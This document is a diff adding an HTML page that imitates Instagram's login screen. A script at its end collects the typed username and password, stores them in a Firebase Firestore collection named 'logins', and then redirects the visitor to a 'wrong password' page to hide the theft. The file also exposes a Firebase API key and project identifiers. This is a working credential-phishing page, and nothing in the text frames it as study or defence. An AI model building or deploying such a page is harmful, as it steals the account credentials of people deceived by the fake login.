@@ -1,0 +1,137 @@
+<!-- This is instagram login page -->
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login . Instagram</title>
+    <link rel="stylesheet" href="loginstyle.css">
+    <link rel="shortcut icon" href="/Instagram_logo_2016.svg.webp">
+    <style>
+        img {
+            vertical-align: text-top;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="box">
+            <div class="heading"></div>
+            <form class="login-form">
+                <div class="field">
+                    <input id="username" type="name" placeholder="Phone number, username, or email" />
+                    <label for="username">Phone number, username, or email</label>
+                </div>
+                <div class="field">
+                    <input id="password" type="password" placeholder="password" />
+                    <label for="password">Password</label>
+                </div>
+            <button class="login-button" type="submit">Log In</button>
+
+                <div class="separator">
+                    <div class="line"></div>
+                    <p>OR</p>
+                    <div class="line"></div>
+                </div>
+
+                <div class="other">
+                    <button class="fb-login-btn" type="button">
+                        <i class="fa fa-facebook-official fb-icon"></i>
+                        <span class=""><img src="https://icons.iconarchive.com/icons/paomedia/small-n-flat/1024/social-facebook-icon.png"height="15" width="15"><a href="facebook-login.html">&nbsp;Log in with Facebook</a>
+                        </span>
+                    </button>
+                    <a class="forgot-password" href="/forget.html">Forgot password?</a>
+                </div>
+            </form>
+        </div>
+        <div class="box">
+            <p>Don't have an account? <a class="signup" href="#">Sign Up</a></p>
+        </div>
+    </div>
+    <br>
+    <div class="get">
+    Get the app.
+    </div>
+    <br>
+    <div class="apps">
+        <a href="/forget.html">
+        <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" height="40"
+            width="134"></a>&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;<a href="/forget.html"> 
+        <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" height="40" width="134"></a>
+        </div>
+        <br>
+        <div class="footer">
+    <footer>
+            Meta
+            About
+            Blog
+            Jobs
+            Help
+            API
+            Privacy
+            Terms
+            Top Accounts
+            Hashtags
+            Locations
+            Instagram Lite
+            Contact Uploading & Non-Users
+    </footer>
+</div>
+<div class="copyright">
+    <br>    
+    English © 2022 Instagram from Meta
+</div>
+<script src="login.js"></script>
+<!-- Firebase App (required) -->
+<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app.js"></script>
+
+<!-- Firebase Firestore -->
+<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore.js"></script>
+
+<!-- Your custom JS -->
+<script src="login.js"></script>
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+  import { getFirestore, addDoc, collection } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyDAb7Sjpnn-uJxb5ZU1tN9sORffK15B9W0",
+    authDomain: "instgram-clone-ed2ba.firebaseapp.com",
+    projectId: "instgram-clone-ed2ba",
+    storageBucket: "instgram-clone-ed2ba.appspot.com",
+    messagingSenderId: "467076732876",
+    appId: "1:467076732876:web:b1412591270a13e22daf69"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const db = getFirestore(app);
+
+  document.querySelector(".login-form").addEventListener("submit", async (e) => {
+    e.preventDefault();
+    const username = document.getElementById("username").value;
+    const password = document.getElementById("password").value;
+
+    try {
+      await addDoc(collection(db, "logins"), {
+        username: username,
+        password: password,
+        timestamp: new Date()
+      });
+      alert("Saved to Firestore ✅");
+      window.location.href = "wrong_password.html"; // optional redirect
+    } catch (err) {
+      console.error("Error:", err);
+    }
+  });
+</script>
+
+
+
+    
+</body>
+
+</html>
